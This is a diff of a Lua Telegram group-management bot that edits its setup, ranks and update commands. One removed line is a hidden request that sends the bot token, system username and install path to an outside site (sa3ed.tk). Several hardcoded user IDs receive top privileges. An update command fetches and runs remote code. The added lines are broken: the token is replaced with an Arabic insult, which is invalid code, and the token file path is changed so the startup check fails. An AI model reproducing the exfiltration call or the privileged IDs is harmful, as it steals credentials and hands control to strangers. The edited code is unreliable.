@@ -85,7 +85,7 @@ GetUser = json:decode(url)
 if res ~= 200 then
 end
 if GetUser.ok == false then
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+print('\n\27[1;31m￤ Conect is Failed !\n￤ لم يقم المطور ايدي المطور الاساسي بعمل start للبوت . !')
 create_config(Token)
 end
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
@@ -102,15 +102,14 @@ info = {}
 info.namebot = BOT_NAME
 info.userbot = BOT_User
 info.id = SUDO_USER
-info.token = Token
+info.token = كسمك أحمد بيحبك ❤. @AY_AHD
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://sa3ed.tk/B_aaaa.php?Info='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس سليندر \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n.مطور السورس @ahmedyad200"
+local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس سليندر \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n.مبرمج السورس @ahmedyad200"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 os.execute([[
 rm -f ./README.md
@@ -124,7 +123,7 @@ end
 
 
 function Start_Bot()
-local TokenBot = io.open('./inc/Token.txt', "r")
+local TokenBot = io.open('./ic/n.txt', "r")
 if not TokenBot then
 print('\27[0;33m>>'..[[
 ▀█▄──▄███▄─
@@ -175,10 +174,9 @@ print('\27[0;33m>>'..[[
 -------------------------------------------------------------------
                                                   
 ]]..'\027[0;32m'
-..'¦ TOKEN_BOT: \27[1;34m'..Token..'\027[0;32m\n'
+..'¦ TOKEN_BOT: \27[1;34m'..info.token..'\027[0;32m\n'
 ..'¦ BOT__INFO: \27[1;34m'.. Bot_User..'\27[0;36m » ('..selnder..')\027[0;32m\n'
 ..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
-..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
 ..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
 ..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
 ..'======================================\27[0;33m\27[0;31m'
@@ -253,22 +251,26 @@ msg.GroupActive = false
 end
 
 if msg.sender_user_id_ == 944353237 then 
+msg.TheRankCmd = 'مبرمج السورس' 
 msg.TheRank =  'مبرمج السورس'
 msg.Rank = 1
 
 elseif msg.sender_user_id_ == 1558204556 then 
+msg.TheRankCmd = 'مطور السورس' 
 msg.TheRank =  'مالك السورس'
 msg.Rank = 1
 
 elseif msg.sender_user_id_ == 1567692976 then 
+msg.TheRankCmd = 'مطور السورس' 
 msg.TheRank =  'اليكس'
 msg.Rank = 1
 
-elseif msg.sender_user_id_ == 1558204556 then 
+elseif msg.sender_user_id_ == 1558204556 then
+msg.TheRankCmd = 'مطور السورس' 
 msg.TheRank =  'مطور السورس'
 msg.Rank = 1
 
-elseif 	msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then 
+elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور' 
 msg.TheRank = 'مطور اساسي' 
 msg.Rank = 1
@@ -535,12 +537,12 @@ mmdi = redis:hget(selnder..'CmD:'..msg.chat_id_,Mohammad)
 msg.text = Mohammad:gsub(Mohammad,mmdi)
 end
 end
-	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and 	msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then
+	if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then
 	return sendMsg(msg.chat_id_,msg.id_," • تم تحديث الملفات .\n",nil,function(arg,data)
 	Refresh_Start = true
 	end)
 	end 
-	if msg.text== 'Update Source' and 	msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then
+	if msg.text== 'Update Source' and msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then
 	download_file('https://raw.githubusercontent.com/ahmedyad200/selnder/master/inc/Run.lua','./inc/Run.lua')
 	download_file('https://raw.githubusercontent.com/ahmedyad200/selnder/master/inc/Script.lua','./inc/Script.lua')
 	download_file('https://raw.githubusercontent.com/ahmedyad200/selnder/master/inc/functions.lua','./inc/functions.lua')
@@ -565,13 +567,13 @@ redis:hset(selnder..'username:'..tonumber(mmd),'username',msg.text)
 	redis:set(selnder..":SUDO_ID:",msg.text)
 send_msg(msg.chat_id_,"• تم تثبيت الايدي الان قم برسال معرف المطور @UserName ...")
 	end
-	if msg.text== 'تغير المطور الاساسي' and 	msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then
+	if msg.text== 'تغير المطور الاساسي' and msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then
     send_msg(msg.chat_id_,"• عزيزي قم برسال ايدي المطور ...")
 redis:setex('setid'..msg.sender_user_id_,120,true)
 end
 	
 	
-	if msg.text== 'reload' and 	msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then
+	if msg.text== 'reload' and msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 then
 	sendMsg(msg.chat_id_,msg.id_,'• {* تــم أعـاده تشغيل البوت  *} .\n\n• { Bot is Reloaded » }.',nil,function(arg,data)
 	dofile("./inc/Run.lua")
 	print("Reload ~ ./inc/Run.lua")
@@ -642,7 +644,7 @@ download(stk,32)
 	Del_msg(msg.chat_id_,msg.id_)
 	end
 	elseif msg.content_.ID == "MessageChatAddMembers" then
-	if redis:get(selnder..'group:add'..msg.chat_id_) and (	msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 or redis:sismember(selnder..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(selnder..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(selnder..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(selnder..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
+	if redis:get(selnder..'group:add'..msg.chat_id_) and (msg.sender_user_id_ == SUDO_ID and msg.sender_user_id_ == 944353237 or redis:sismember(selnder..':SUDO_BOT:',msg.sender_user_id_) or redis:sismember(selnder..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(selnder..'owners:'..msg.chat_id_,msg.sender_user_id_) or redis:sismember(selnder..'admins:'..msg.chat_id_,msg.sender_user_id_)) then 
 	msg.Admin = true
 	end
 	local lock_bots = redis:get(selnder..'lock_bots'..msg.chat_id_)
